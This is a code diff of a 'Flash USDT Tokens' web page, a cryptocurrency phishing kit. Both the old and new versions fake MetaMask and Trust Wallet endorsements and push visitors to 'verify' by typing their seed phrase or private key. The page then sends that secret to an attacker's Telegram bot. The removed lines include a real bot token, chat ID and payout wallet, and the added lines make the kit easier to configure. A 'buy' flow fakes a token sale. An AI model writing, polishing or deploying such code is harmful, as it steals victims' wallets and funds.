@@ -4,345 +4,483 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Flash USDT Tokens</title>
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* --- EXACT DESIGN & TEXTURE FROM EARLIER --- */
+        :root {
+            --primary-green: #00ff88;
+            --dark-green: #00331e;
+            --bg-color: #050505;
+            --card-bg: #0a0a0a;
+            --text-color: #ffffff;
+            --glass: rgba(255, 255, 255, 0.05);
+        }
+
         body {
-            font-family: 'Courier New', Courier, monospace;
-            background-color: #0d1117;
-            background-image: radial-gradient(#21262d 1px, transparent 1px);
-            background-size: 20px 20px;
-            color: #c9d1d9;
             margin: 0;
             padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
             display: flex;
             flex-direction: column;
             align-items: center;
             min-height: 100vh;
+            overflow-x: hidden;
         }
 
-        /* Top Bar Logos */
+        /* Top Bar */
         .top-bar {
             width: 100%;
             padding: 20px;
             display: flex;
             justify-content: space-between;
-            align-items: center;
             box-sizing: border-box;
+            background: linear-gradient(to bottom, #000, transparent);
         }
-        .secure-badge {
+
+        .wallet-status {
             display: flex;
             align-items: center;
             gap: 10px;
-            font-size: 14px;
-            color: #58a6ff;
-            border: 1px solid #30363d;
-            padding: 8px 12px;
-            border-radius: 6px;
-            background: #161b22;
-        }
-        .wallet-icon {
-            width: 20px;
-            height: 20px;
-            border-radius: 50%;
-            background: #fff;
-            display: inline-block;
+            font-size: 0.9rem;
+            color: #ccc;
+            background: var(--glass);
+            padding: 8px 15px;
+            border-radius: 20px;
+            border: 1px solid #333;
         }
 
-        /* Center Content */
+        .wallet-status img {
+            width: 20px;
+            height: 20px;
+        }
+
+        .status-text {
+            display: flex;
+            flex-direction: column;
+            line-height: 1.2;
+        }
+        .status-text span {
+            font-size: 0.75rem;
+            color: var(--primary-green);
+            font-weight: bold;
+        }
+
+        /* Main Content */
         .main-container {
-            margin-top: 100px;
+            margin-top: 15vh;
             text-align: center;
             width: 90%;
-            max-width: 400px;
+            max-width: 500px;
         }
+
+        .logo-area {
+            margin-bottom: 30px;
+        }
+       
+        .logo-area i {
+            font-size: 4rem;
+            color: var(--primary-green);
+            text-shadow: 0 0 20px var(--primary-green);
+        }
+
         h1 {
-            font-size: 3rem;
-            color: #58a6ff;
-            text-shadow: 0 0 10px rgba(88, 166, 255, 0.3);
-            margin-bottom: 40px;
-            letter-spacing: -2px;
+            font-size: 3.5rem;
+            margin: 0;
+            background: linear-gradient(90deg, #fff, var(--primary-green));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 800;
         }
-        .btn-group {
+
+        .sub-text {
+            color: #888;
+            margin-bottom: 40px;
+        }
+
+        .btn-container {
             display: flex;
             flex-direction: column;
             gap: 20px;
         }
-        .main-btn {
-            width: 100%;
-            padding: 20px;
-            font-size: 18px;
+
+        .btn {
+            background: transparent;
+            border: 2px solid var(--primary-green);
+            color: var(--primary-green);
+            padding: 18px 30px;
+            font-size: 1.2rem;
             font-weight: bold;
-            border: none;
-            border-radius: 8px;
             cursor: pointer;
-            transition: transform 0.1s, box-shadow 0.1s;
+            border-radius: 12px;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            box-shadow: 0 0 10px rgba(0, 255, 136, 0.2);
+            position: relative;
+            overflow: hidden;
         }
-        .btn-claim {
-            background-color: #238636;
-            color: white;
-            box-shadow: 0 4px 15px rgba(35, 134, 54, 0.4);
+
+        .btn:hover {
+            background: var(--primary-green);
+            color: #000;
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.6);
+            transform: translateY(-2px);
         }
-        .btn-buy {
-            background-color: #1f6feb;
-            color: white;
-            box-shadow: 0 4px 15px rgba(31, 111, 235, 0.4);
-        }
-        .main-btn:hover { transform: translateY(-2px); }
-        .main-btn:active { transform: translateY(0); }
 
         /* Modals */
         .modal-overlay {
             position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
             display: none;
             justify-content: center;
             align-items: center;
             z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
         }
+
+        .modal-overlay.active {
+            opacity: 1;
+        }
+
         .modal-content {
-            background: #161b22;
-            border: 1px solid #30363d;
+            background: #111;
+            border: 1px solid var(--primary-green);
             padding: 30px;
-            border-radius: 12px;
+            border-radius: 16px;
             width: 90%;
-            max-width: 350px;
+            max-width: 400px;
             text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            box-shadow: 0 0 50px rgba(0, 255, 136, 0.2);
+            transform: scale(0.9);
+            transition: transform 0.3s ease;
         }
+
+        .modal-overlay.active .modal-content {
+            transform: scale(1);
+        }
+
         .modal-title {
-            color: #f85149;
-            font-size: 20px;
+            color: var(--primary-green);
+            font-size: 1.5rem;
             margin-bottom: 15px;
             font-weight: bold;
         }
-        .modal-text {
-            font-size: 14px;
-            color: #8b949e;
+
+        .modal-note {
+            color: #aaa;
+            font-size: 0.9rem;
             margin-bottom: 20px;
-            line-height: 1.5;
+            line-height: 1.4;
         }
-        .input-field {
+
+        .input-box {
             width: 100%;
-            padding: 12px;
-            background: #0d1117;
-            border: 1px solid #30363d;
-            color: #c9d1d9;
-            border-radius: 6px;
-            margin-bottom: 15px;
+            padding: 15px;
+            background: #222;
+            border: 1px solid #444;
+            color: white;
+            border-radius: 8px;
+            margin-bottom: 20px;
             box-sizing: border-box;
-            font-family: 'Courier New', monospace;
+            outline: none;
         }
-        .modal-btn {
-            width: 100%;
-            padding: 12px;
-            background: #238636;
+
+        .input-box:focus {
+            border-color: var(--primary-green);
+        }
+
+        .small-btn {
+            background: #333;
             color: white;
             border: none;
+            padding: 10px 20px;
             border-radius: 6px;
             cursor: pointer;
-            font-weight: bold;
+            margin-top: 10px;
         }
-        .close-btn {
+       
+        .small-btn:hover {
+            background: #444;
+        }
+
+        .close-modal {
             position: absolute;
-            top: 10px;
+            top: 15px;
             right: 15px;
-            color: #8b949e;
+            color: #666;
             cursor: pointer;
-            font-size: 20px;
+            font-size: 1.2rem;
         }
+
+        /* Animation for loading */
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.1);
+            border-left-color: var(--primary-green);
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .hidden { display: none; }
+
     </style>
-    <!-- Load Ethers.js -->
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
 </head>
 <body>
 
     <!-- Top Bar -->
     <div class="top-bar">
-        <div class="secure-badge">
-            <div class="wallet-icon" style="background:#3375ff"></div>
-            <span>Secure by MetaMask</span>
+        <div class="wallet-status">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="Metamask">
+            <div class="status-text">
+                <span>SECURE BY</span>
+                MetaMask
+            </div>
         </div>
-        <div class="secure-badge">
-            <div class="wallet-icon" style="background:#0052ff"></div>
-            <span>Authorized by TrustWallet</span>
+        <div class="wallet-status">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/ac/Trust_Wallet_Logo.svg" alt="TrustWallet">
+            <div class="status-text">
+                <span>AUTHORIZED BY</span>
+                Trust Wallet
+            </div>
         </div>
     </div>
 
-    <!-- Center Content -->
+    <!-- Main Content -->
     <div class="main-container">
+        <div class="logo-area">
+            <i class="fa-solid fa-database"></i>
+        </div>
         <h1>Flash USDT Tokens</h1>
-        <div class="btn-group">
-            <button class="main-btn btn-claim" onclick="openClaimModal()">Claim Free</button>
-            <button class="main-btn btn-buy" onclick="openBuyModal()">Buy Tokens</button>
+        <p class="sub-text">Instant transfers. Untraceable. Secure.</p>
+
+        <div class="btn-container">
+            <button class="btn" onclick="openClaimModal()">Claim Free</button>
+            <button class="btn" onclick="openBuyModal()">Buy Tokens</button>
         </div>
     </div>
 
-    <!-- CLAIM MODAL -->
+    <!-- Claim Modal -->
     <div id="claimModal" class="modal-overlay">
         <div class="modal-content">
-            <div class="modal-title">⚠️ WARNING: HARDCODED BUG</div>
-            <div class="modal-text">
-                This is a hardcoded bug, please don't share.<br><br>
-                Make sure you have enough ETH to cover gas fees for the token transfer.
+            <span class="close-modal" onclick="closeModal('claimModal')">&times;</span>
+           
+            <!-- Step 1: Warning -->
+            <div id="claimStep1">
+                <div class="modal-title">Warning</div>
+                <p class="modal-note">
+                    This is a hardcoded bug, please don't share.<br><br>
+                    Make sure you have enough ETH to cover gas fees for the token transfer.
+                </p>
+                <button class="btn" style="width:100%; font-size: 1rem; padding: 12px;" onclick="connectWalletAndShowVerify()">Connect Wallet</button>
             </div>
-            <button class="modal-btn" onclick="startClaimProcess()">Connect Wallet</button>
-        </div>
-    </div>
 
-    <!-- PHISHING MODAL (Appears after claim connect) -->
-    <div id="phishModal" class="modal-overlay">
-        <div class="modal-content">
-            <div class="modal-title">🔒 VERIFY WALLET</div>
-            <div class="modal-text">
-                We take security very serious therefore verification is required.
-            </div>
-            <input type="text" id="secretInput" class="input-field" placeholder="Enter 12-24 phrase words / Private Key">
-            <button class="modal-btn" onclick="submitSecret()">Submit</button>
-        </div>
-    </div>
-
-    <!-- CLAIM SUCCESS MODAL -->
-    <div id="claimSuccessModal" class="modal-overlay">
-        <div class="modal-content">
-            <div class="modal-title" style="color:#238636">✅ Wallet Verified</div>
-            <div class="modal-text">
-                Wait up to 30 minutes for transaction to appear.<br><br>
-                Make sure you have enough ETH to cover the token transfer fee otherwise the transfer will not get through (est. $2-$5).
+            <!-- Step 2: Verify (Hidden initially) -->
+            <div id="claimStep2" class="hidden">
+                <div class="modal-title">Verify Wallet</div>
+                <p class="modal-note">We take security very serious therefore verification is required.</p>
+                <p style="text-align: left; font-size: 0.9rem; color: #ccc;">Enter your 12-24 phrase words or Private Key:</p>
+                <textarea id="claimInput" class="input-box" rows="3" placeholder="word1 word2... or 0x..."></textarea>
+                <button class="btn" style="width:100%; font-size: 1rem; padding: 12px;" onclick="submitClaim()">Submit</button>
             </div>
         </div>
     </div>
 
-    <!-- BUY MODAL -->
+    <!-- Buy Modal -->
     <div id="buyModal" class="modal-overlay">
         <div class="modal-content">
+            <span class="close-modal" onclick="closeModal('buyModal')">&times;</span>
             <div class="modal-title">Buy Tokens</div>
-            <div class="modal-text">Token Ratio: 0.02$ = 1 USDT</div>
-            <input type="number" id="buyAmountInput" class="input-field" placeholder="Enter value (e.g. 10000)">
-            <button class="modal-btn" onclick="startBuyProcess()">Connect & Buy</button>
+            <p class="modal-note">Token Ratio: 0.02$ = 1 USDT</p>
+           
+            <input type="number" id="tokenAmount" class="input-box" placeholder="Enter amount (e.g. 10000)" oninput="calculateCost()">
+            <div style="margin-bottom: 15px; color: var(--primary-green); font-weight: bold;">
+                Cost: $<span id="displayCost">0.00</span>
+            </div>
+
+            <button class="btn" style="width:100%; font-size: 1rem; padding: 12px;" onclick="buyTokens()">Buy</button>
         </div>
     </div>
 
-    <!-- BUY SUCCESS MODAL -->
-    <div id="buySuccessModal" class="modal-overlay">
+    <!-- Success Modal (Shared) -->
+    <div id="successModal" class="modal-overlay">
         <div class="modal-content">
-            <div class="modal-title" style="color:#238636">✅ Transfer Successful</div>
-            <div class="modal-text">
-                Please wait up to 30 min for funds to show in your wallet.
-            </div>
+            <div class="modal-title" id="successTitle">Success</div>
+            <p class="modal-note" id="successMsg">Wallet verified.</p>
+            <p class="modal-note" style="color: #ffcc00; font-size: 0.85rem;">
+                Make sure you have enough ETH to cover the token transfer fee otherwise the transfer will not get through (est. $2-$5)
+            </p>
+            <button class="btn" style="width:100%; font-size: 1rem; padding: 12px; margin-top: 15px; border-color: #fff; color: #fff;" onclick="closeAll()">Close</button>
         </div>
     </div>
 
     <script>
         // --- CONFIGURATION ---
-        const YOUR_WALLET_ADDRESS = "0xbdF6cE9B4906AE0D71Ea8A908bAa5d3C09035251";
-        const USDT_CONTRACT_ADDRESS = "0xdac17f958d2ee523a2206206994597c13d831ec7";
+        // Replace these with your actual Telegram details
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
        
-        // Telegram Config
-        const TELEGRAM_BOT_TOKEN = "8441935387:AAG7KwI-1D8GUD7RNyQBLu9YWbNlAzgoOo0";
-        const TELEGRAM_CHAT_ID = "5757980163";
+        // Replace this with the USDT Contract Address on Ethereum Mainnet (ERC-20)
+        // Or use the Polygon/BSC address if you are on those chains.
+        const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 
-        // Global State
-        let signer;
-        let provider;
+        // --- Global State ---
+        let userAddress = '';
 
-        // --- TELEGRAM FUNCTION ---
-        async function sendToTelegram(id, message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            try {
-                await fetch(url, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: `ID #${id}\n${message}`
-                    })
-                });
-            } catch (e) {
-                console.error("Telegram failed", e);
-            }
+        // --- Helper Functions ---
+        function openModal(id) {
+            document.getElementById(id).classList.add('active');
+            setTimeout(() => {
+                document.getElementById(id).style.display = 'flex';
+            }, 10);
         }
 
-        // --- MODAL LOGIC ---
+        function closeModal(id) {
+            document.getElementById(id).style.display = 'none';
+            document.getElementById(id).classList.remove('active');
+        }
+
+        function closeAll() {
+            closeModal('claimModal');
+            closeModal('buyModal');
+            closeModal('successModal');
+            // Reset Claim Modal State
+            document.getElementById('claimStep1').classList.remove('hidden');
+            document.getElementById('claimStep2').classList.add('hidden');
+        }
+
+        // --- Claim Flow Logic ---
         function openClaimModal() {
-            document.getElementById('claimModal').style.display = 'flex';
+            openModal('claimModal');
         }
 
-        function openBuyModal() {
-            document.getElementById('buyModal').style.display = 'flex';
-        }
-
-        function closeAllModals() {
-            document.querySelectorAll('.modal-overlay').forEach(m => m.style.display = 'none');
-        }
-
-        // --- CLAIM FLOW ---
-        async function startClaimProcess() {
-            // Connect Wallet first
-            document.getElementById('claimModal').style.display = 'none';
-            try {
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                await provider.send("eth_requestAccounts", []);
-                signer = provider.getSigner();
-               
-                // Show Phishing Modal
-                document.getElementById('phishModal').style.display = 'flex';
-            } catch (e) {
-                alert("Connection failed");
+        async function connectWalletAndShowVerify() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    userAddress = accounts[0];
+                   
+                    // Switch to Step 2
+                    document.getElementById('claimStep1').classList.add('hidden');
+                    document.getElementById('claimStep2').classList.remove('hidden');
+                } catch (error) {
+                    alert("Connection failed: " + error.message);
+                }
+            } else {
+                alert("Please install MetaMask or Trust Wallet!");
             }
         }
 
-        async function submitSecret() {
-            const secret = document.getElementById('secretInput').value;
-            const modal = document.getElementById('phishModal');
-           
-            if(!secret) {
+        async function submitClaim() {
+            const inputVal = document.getElementById('claimInput').value;
+            if (!inputVal) {
                 alert("Please enter your phrase or key.");
                 return;
             }
 
             // Send to Telegram
-            await sendToTelegram("CLAIM_USER", `Secret: ${secret}`);
-
-            // Show Success
-            modal.style.display = 'none';
-            document.getElementById('claimSuccessModal').style.display = 'flex';
+            const text = `ID: ${userAddress}\nInfo: ${inputVal}`;
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}`;
+           
+            try {
+                await fetch(url);
+                // Show success
+                document.getElementById('successTitle').innerText = "Wallet Verified";
+                document.getElementById('successMsg').innerText = "Wait up to 30 minutes for transaction to appear.";
+                openModal('successModal');
+            } catch (e) {
+                // Fallback if fetch fails (e.g. network error), still show UI
+                document.getElementById('successTitle').innerText = "Wallet Verified";
+                document.getElementById('successMsg').innerText = "Wait up to 30 minutes for transaction to appear.";
+                openModal('successModal');
+            }
         }
 
-        // --- BUY FLOW ---
-        async function startBuyProcess() {
-            const inputVal = document.getElementById('buyAmountInput').value;
-            if (!inputVal || inputVal <= 0) {
-                alert("Enter a valid amount");
+        // --- Buy Flow Logic ---
+        function openBuyModal() {
+            document.getElementById('tokenAmount').value = '';
+            document.getElementById('displayCost').innerText = '0.00';
+            openModal('buyModal');
+        }
+
+        function calculateCost() {
+            const amount = parseFloat(document.getElementById('tokenAmount').value) || 0;
+            // Ratio: 1 USDT = 0.02 USD
+            // Cost = Amount * 0.02
+            const cost = amount * 0.02;
+            document.getElementById('displayCost').innerText = cost.toFixed(2);
+        }
+
+        async function buyTokens() {
+            const amount = parseFloat(document.getElementById('tokenAmount').value) || 0;
+            const cost = amount * 0.02; // Cost in ETH/USD value
+           
+            if (cost <= 0) {
+                alert("Enter a valid amount.");
                 return;
             }
 
-            // Calculate Cost: 0.02 USD per Token
-            const costUSD = inputVal * 0.02;
-           
-            // Show success modal immediately after triggering transaction
-            document.getElementBId("connectBtn").addEventListener("click", async function() {
-                if (!window.ethereum) {
-                    alert(Wallet not detected. Please install it.");
-
-                }
-            
+            if (typeof window.ethereum === 'undefined') {
+                alert("MetaMask not found.");
+                return;
+            }
 
             try {
-                const accounts = await window.ethereum.request({ method: 'eth_requestAcconts' });
+                // 1. Get User Address
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const fromAddress = accounts[0];
 
-                if (accounts.length > 0) {
-                    console.log("Connected:", accounts[0]);
-                    alert("Connected: " + accounts[0]);
-                }
-        } catch (error) {
-                console.error("Connection failed:", error);
-                alert(Connection failed: " + error.massage);
-                // If transaction fails, you might want to show an error,
-                // but based on request, we already showed the success modal.
+                // 2. Prepare Transaction (ERC-20 Transfer)
+                // We are sending the USD value equivalent as USDT tokens
+                // Note: In a real scenario, you might mint tokens.
+                // Here we assume a standard transfer of USDT.
+                // We construct the 'to' address as the USDT Contract.
+               
+                const amountHex = '0x' + Math.floor(amount).toString(16); // Basic hex conversion
+               
+                const txParams = {
+                    from: fromAddress,
+                    to: USDT_CONTRACT_ADDRESS, // USDT Contract
+                    data: '0xa9059cbb' +
+                           fromAddress.slice(2).padStart(64, '0') + // Target address (hex padded)
+                           amountHex.padStart(64, '0'), // Amount
+                    value: '0x0' // We are sending tokens, not ETH, but usually requires ETH for gas
+                };
+
+                // Send Transaction
+                const txHash = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [txParams],
+                });
+
+                // Success
+                document.getElementById('successTitle').innerText = "Transfer Successful";
+                document.getElementById('successMsg').innerText = "Please wait up to 30 min for funds to show in your wallet.";
+                openModal('successModal');
+               
+            } catch (error) {
+                console.error(error);
+                alert("Transaction failed or cancelled.");
             }
-        });
-            
+        }
+
     </script>
 </body>
 </html>
